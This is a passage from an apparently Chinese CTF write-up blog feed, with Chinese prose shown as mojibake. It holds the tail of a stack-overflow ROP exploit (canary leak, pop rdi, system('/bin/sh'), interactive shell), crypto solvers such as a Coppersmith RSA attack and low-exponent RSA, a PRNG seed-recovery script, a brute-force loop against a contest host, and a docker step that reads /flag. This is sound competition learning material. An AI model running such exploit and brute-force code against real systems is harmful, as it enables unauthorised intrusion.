class="number">0x9A93</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x108</span> + p64(leak_canary) + <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="strange-hash"><a href="#strange-hash" class="headerlink" title="strange_hash"></a>strange_hash</h2><p>æ³¨æ„åˆ°æ²¡éªŒè¯num tupleé•¿åº¦ï¼Œç›´æ¥æ±‚é€†é—®é¢˜ç„¶ååœ¨å¾—åˆ°çš„ä¸‰å…ƒç»„ååŠ ä¸€ä½0å°±è¡Œã€‚</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p = <span class="number">18446744073709551557</span></span><br><span class="line">M = [[<span class="number">8</span>, <span class="number">56</span>, <span class="number">280</span>], [<span class="number">18446744073709551543</span>, <span class="number">18446744073709551467</span>, <span class="number">18446744073709551123</span>], [<span class="number">7</span>, <span class="number">35</span>, <span class="number">155</span>]]</span><br><span class="line">ConInv = [<span class="number">0x39a3f978106bac2d</span>,<span class="number">0x2940e055f4a33725</span>,<span class="number">0xfda9a7a293fb5bc9</span>]</span><br><span class="line">Con = [[<span class="number">0x9c52c2de7a9373c4</span>,<span class="number">0xf2135cb886d0fa21</span>,<span class="number">0x957df7f3cd4879e9</span>], [<span class="number">0xd54f837d2738d717</span>,<span class="number">0x400ddf1ffaae436d</span>,<span class="number">0xc2abb601d9a26b07</span>], [<span class="number">0x1904359f1deb3495</span>,<span class="number">0xc21aa09ba52b157b</span>,<span class="number">0x3d45525db1b19a0c</span>], [<span class="number">0xed66cf26a65afc73</span>,<span class="number">0x1cee569b29ffa476</span>,<span class="number">0x3da45abf4304849</span>], [<span class="number">0x1c1a642fa0f3d96d</span>,<span class="number">0x59a1c4fbb96aec86</span>,<span class="number">0xa18e9ca93163f63d</span>], [<span class="number">0x9621ec9fbcb402be</span>,<span class="number">0xd69468353c31bee0</span>,<span class="number">0x50655b3f20fee3b8</span>], [<span class="number">0x109cde7a61c2c195</span>,<span class="number">0x5ebbd9e98be60c59</span>,<span class="number">0x334d2d15f6e43190</span>], [<span class="number">0x47af2b0d63901977</span>,<span class="number">0x67ace097bf8c6f34</span>,<span class="number">0xb87da3296b70d64b</span>], [<span class="number">0x52d6344b38f49899</span>,<span class="number">0xad5773add31420e1</span>,<span class="number">0xecd0b7480f8c8095</span>], [<span class="number">0xe2afb6d20f5decda</span>,<span class="number">0xb1767d8be7d1371</span>,<span class="number">0x902fd6806a0ef4db</span>]]</span><br><span class="line"></span><br><span class="line">M = matrix(GF(p), M)</span><br><span class="line">u = vector(Zmod(p), [<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line">phi = M.multiplicative_order()</span><br><span class="line">d = inverse_mod(<span class="number">3</span>, phi)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mypow</span>(<span class="params">c, a</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        res.append(<span class="built_in">pow</span>(i, a, p))</span><br><span class="line">    <span class="keyword">return</span> vector(GF(p), res)</span><br><span class="line"></span><br><span class="line">c3 = vector(GF(p), Con[<span class="number">3</span>])</span><br><span class="line">c2 = vector(GF(p), Con[<span class="number">2</span>])</span><br><span class="line">c1 = vector(GF(p), Con[<span class="number">1</span>])</span><br><span class="line">c0 = vector(GF(p), Con[<span class="number">0</span>])</span><br><span class="line">ni = M^(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">u = mypow((u-c3)*ni, <span class="number">3</span>)</span><br><span class="line">u = mypow((u-c2)*ni, d)</span><br><span class="line">u = mypow((u-c1)*ni, <span class="number">3</span>)</span><br><span class="line">u = mypow((u-c0)*ni, d)-vector(GF(p), ConInv)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(u)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">(5329202944861711021, 10075872277090249537, 6598944197421011167,0 )</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="lift"><a href="#lift" class="headerlink" title="lift"></a>lift</h2><p>ged-251&#x3D;0 mod p^4ï¼Œcoppersmithå–beta&#x3D;4&#x2F;6ï¼Œepsilon&#x3D;0.03æ±‚è§£d mod p^4ï¼Œåˆ©ç”¨ed-1å’Œnåšgcdåˆ†è§£nï¼Œæœ€åæœ‰é™åŸŸå¼€æ ¹åšliftå³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line">n = <span class="number">108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077</span></span><br><span class="line">e = <span class="number">3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039</span></span><br><span class="line">c = <span class="number">72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = e*x-<span class="number">251</span></span><br><span class="line">f = f.monic()</span><br><span class="line"></span><br><span class="line">d = f.small_roots(X=<span class="number">2</span>^<span class="number">256</span>, beta=<span class="number">0.63</span>, epsilon=<span class="number">0.03</span>)[<span class="number">0</span>]</span><br><span class="line">p = iroot(GCD(e*d-<span class="number">251</span>, n), <span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">q = n//p^<span class="number">5</span></span><br><span class="line"><span class="keyword">assert</span> n == p^<span class="number">5</span>*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*p^<span class="number">4</span>*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e//<span class="number">251</span>, phi)</span><br><span class="line">cm = ZZ(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"></span><br><span class="line">F1 = Zmod(p^<span class="number">3</span>)</span><br><span class="line">F2 = Zmod(q)</span><br><span class="line"></span><br><span class="line">root1 = F1(cm).nth_root(<span class="number">251</span>, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">root2 = F2(cm).nth_root(<span class="number">251</span>, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> root1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> root2:</span><br><span class="line">        m = ZZ(crt([ZZ(i), ZZ(j)], [p^<span class="number">3</span>, q]))</span><br><span class="line">        <span class="keyword">if</span> m.nbits() &lt;= <span class="number">512</span>:</span><br><span class="line">            m = long_to_bytes(m)</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF 2nd wp</title>
    <url>/posts/4b18615c/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="NSSCTF-2nd-WP"><a href="#NSSCTF-2nd-WP" class="headerlink" title="NSSCTF 2nd WP"></a>NSSCTF 2nd WP</h1><span id="more"></span>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="gift-in-qrcode"><a href="#gift-in-qrcode" class="headerlink" title="gift_in_qrcode"></a>gift_in_qrcode</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange, getrandbits, seed</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = os.getenv(<span class="string">&quot;FLAG&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> flag == <span class="literal">None</span>:</span><br><span class="line">    flag = <span class="string">&quot;flag&#123;test&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">secret_seed = randrange(<span class="number">1</span>, <span class="number">1000</span>)</span><br><span class="line">seed(secret_seed)</span><br><span class="line">reveal = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    reveal.append(<span class="built_in">str</span>(getrandbits(<span class="number">8</span>)))</span><br><span class="line">target = getrandbits(<span class="number">8</span>)</span><br><span class="line">reveal = <span class="string">&quot;,&quot;</span>.join(reveal)</span><br><span class="line"></span><br><span class="line">img_qrcode = qrcode.make(reveal)</span><br><span class="line">img_qrcode = img_qrcode.crop((<span class="number">35</span>, <span class="number">35</span>, img_qrcode.size[<span class="number">0</span>] - <span class="number">35</span>, img_qrcode.size[<span class="number">1</span>] - <span class="number">35</span>))</span><br><span class="line"></span><br><span class="line">offset, delta, rate = <span class="number">50</span>, <span class="number">3</span>, <span class="number">5</span></span><br><span class="line">img_qrcode = img_qrcode.resize(</span><br><span class="line">    (<span class="built_in">int</span>(img_qrcode.size[<span class="number">0</span>] / rate), <span class="built_in">int</span>(img_qrcode.size[<span class="number">1</span>] / rate)), Image.LANCZOS</span><br><span class="line">)</span><br><span class="line">img_out = Image.new(<span class="string">&quot;RGB&quot;</span>, img_qrcode.size)</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(img_qrcode.size[<span class="number">1</span>]):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img_qrcode.size[<span class="number">0</span>]):</span><br><span class="line">        pixel_qrcode = img_qrcode.getpixel((x, y))</span><br><span class="line">        <span class="keyword">if</span> pixel_qrcode == <span class="number">255</span>:</span><br><span class="line">            img_out.putpixel(</span><br><span class="line">                (x, y),</span><br><span class="line">                (</span><br><span class="line">                    randrange(offset, offset + delta),</span><br><span class="line">                    randrange(offset, offset + delta),</span><br><span class="line">                    randrange(offset, offset + delta),</span><br><span class="line">                ),</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img_out.putpixel(</span><br><span class="line">                (x, y),</span><br><span class="line">                (</span><br><span class="line">                    randrange(offset - delta, offset),</span><br><span class="line">                    randrange(offset - delta, offset),</span><br><span class="line">                    randrange(offset - delta, offset),</span><br><span class="line">                ),</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">img_out.save(<span class="string">&quot;qrcode.png&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;qrcode.png&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;This my gift:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(data).decode(), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"></span><br><span class="line">ans = <span class="built_in">input</span>(<span class="string">&quot;What&#x27;s your answer:&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> ans == <span class="built_in">str</span>(target):</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No no no!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>é¢˜ç›®æ‰€ç»™é™„ä»¶å†…å®¹å¦‚ä¸Š</p>
<p>åˆ†æè¿‡åå‘ç°ç›´æ¥è¾“å…¥æ‰“å°å‡ºçš„targetå³å¯è·å¾—flag</p>
<h3 id="Magic-Docker"><a href="#Magic-Docker" class="headerlink" title="Magic Docker"></a>Magic Docker</h3><p>é¢˜ç›®æç¤ºæ‰§è¡Œå‘½ä»¤ï¼Œdocker run randark&#x2F;nssctf-round15-magic-docker</p>
<p>æ‰§è¡Œè¿‡åå‘ç°è¦æ±‚è¾“å…¥secrect</p>
<p>æŸ¥çœ‹dockeræ–‡ä»¶</p>
<p>å‘ç°appæ–‡ä»¶ä¸‹çš„miain.pyæ–‡ä»¶ä¸º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> click</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="meta">@click.command()</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--secret&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;default=none,between 0 and 100&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">int</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">secret</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(secret)==<span class="built_in">str</span>(answer):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Congratulations!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;But where is your flag?  (=â€µÏ‰â€²=)&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No! You don&#x27;t know anything about docker!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;How dare you! &quot;</span>)</span><br><span class="line"></span><br><span class="line">BANNER=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—            </span></span><br><span class="line"><span class="string">â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•    â•šâ•â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—           </span></span><br><span class="line"><span class="string">â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘        â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘           </span></span><br><span class="line"><span class="string">â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â•šâ•â•â•â•â–ˆâ–ˆâ•‘â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘        â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â•â•â•      â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘           </span></span><br><span class="line"><span class="string">â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘         â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•           </span></span><br><span class="line"><span class="string">â•šâ•â•  â•šâ•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â• â•šâ•â•â•â•â•â•   â•šâ•â•   â•šâ•â•         â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•â•â•šâ•â•â•â•â•â•            </span></span><br><span class="line"><span class="string">                                                                                            </span></span><br><span class="line"><span class="string">â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— </span></span><br><span class="line"><span class="string">â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—</span></span><br><span class="line"><span class="string">â–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘         â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•</span></span><br><span class="line"><span class="string">â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘         â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—</span></span><br><span class="line"><span class="string">â–ˆâ–ˆâ•‘ â•šâ•â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘</span></span><br><span class="line"><span class="string">â•šâ•â•     â•šâ•â•â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â• â•šâ•â• â•šâ•â•â•â•â•â•    â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•</span></span><br><span class="line"><span class="string">                                                                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.system(<span class="string">&quot;rm -f /flag&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(BANNER)</span><br><span class="line">    random.seed(<span class="string">&quot;NSSCTF 2nd&quot;</span>)</span><br><span class="line">    answer=random.randint(<span class="number">0</span>,<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&lt;<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You need to give me the secret!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        func()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>è‹¥æŒ‰ç…§é¢„è®¾å‘½ä»¤æ‰§è¡Œå®Œmain.pyåï¼Œå®¹å™¨ä¼šåˆ é™¤flagæ–‡ä»¶</p>
<p>æ‰€ä»¥æˆ‘ä»¬è‡ªå®šä¹‰dockerå¯åŠ¨å‘½ä»¤</p>
<p>ç›´æ¥æ‰§è¡Œcat &#x2F;flag</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308300038709.png" alt="image-20230829233059165"></p>
<h3 id="gift-in-qrcode-revenge"><a href="#gift-in-qrcode-revenge" class="headerlink" title="gift_in_qrcode(revenge)"></a>gift_in_qrcode(revenge)</h3><p>é“¾æ¥ä¸€ä¸‹å¾—åˆ°ä¸€å †Base64ç¼–ç </p>
<p>å…ˆå†™ä¸ªè„šæœ¬è§£ç Base64ä¿å­˜ä¸ºpng</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Paste the Base64 encoded string here</span></span><br><span class="line">base64_string = <span class="string">&quot;your_base64_string_here&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Decode the Base64 string</span></span><br><span class="line">decoded_data = base64.b64decode(base64_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save the decoded data as a PNG file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;image.png&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decoded_data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308300038022.png"></p>
<p>æ‰«ç å¾—åˆ°äºŒåä¸ªéšæœºæ•°</p>
<p>æ ¹æ®è®¡ç®—éšæœºæ•°ç§å­ï¼Œå¹¶è®¡ç®—ä¸‹ä¸€ä¸ªéšæœºæ•°ï¼Œè¾“å…¥ç¨‹åºä¸­å³å¯æ‹¿åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange, getrandbits, seed</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        secret_seed = i</span><br><span class="line">        seed(secret_seed)</span><br><span class="line">        a = [<span class="number">97</span>,<span class="number">45</span>,<span class="number">232</span>,<span class="number">198</span>,<span class="number">115</span>,<span class="number">215</span>,<span class="number">226</span>,<span class="number">198</span>,<span class="number">32</span>,<span class="number">189</span>,<span class="number">8</span>,<span class="number">210</span>,<span class="number">84</span>,<span class="number">11</span>,<span class="number">150</span>,<span class="number">134</span>,<span class="number">221</span>,<span class="number">207</span>,<span class="number">167</span>,<span class="number">176</span>]</span><br><span class="line">        reveal = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            reveal.append(getrandbits(<span class="number">8</span>))</span><br><span class="line">        <span class="keyword">if</span> reveal == a:</span><br><span class="line">            flag = getrandbits(<span class="number">8</span>)</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="built_in">print</span>(poc())</span><br></pre></td></tr></table></figure>

<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308300038655.png" alt="image-20230830001615052"></p>
<p>ç„¶åæœ€æ— è„‘çš„çˆ†ç ´æ¥äº†</p>
<p>ä¸ºä»€ä¹ˆè¦çˆ†è¿™ä¹ˆä¹…ï¼Œæ—©çŸ¥é“æˆ‘å†å¤šçˆ†ä¸€ä¼šçš„..</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>, <span class="number">28380</span>)</span><br><span class="line">    conn.recvline().decode()</span><br><span class="line">    conn.recvline().decode()</span><br><span class="line">    conn.recv().decode()</span><br><span class="line"></span><br><span class="line">    conn.sendline(<span class="built_in">str</span>(<span class="string">&#x27;110&#x27;</span>).encode())</span><br><span class="line"></span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;count:&#x27;</span>, count)</span><br><span class="line"></span><br><span class="line">    output = conn.recvline().decode()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;No no no!&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308300038607.png" alt="image-20230830001858060"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="EzRSA"><a href="#EzRSA" class="headerlink" title="EzRSA"></a>EzRSA</h3><p>å‘ç°e - 3 ï¼Œä½åŠ å¯†æŒ‡æ•°çˆ†ç ´</p>
<p>è„šæœ¬ä¸€æŠŠæ¢­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"><span class="comment"># è¯»å…¥ n, å¯†æ–‡</span></span><br><span class="line">n = <span class="number">115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">  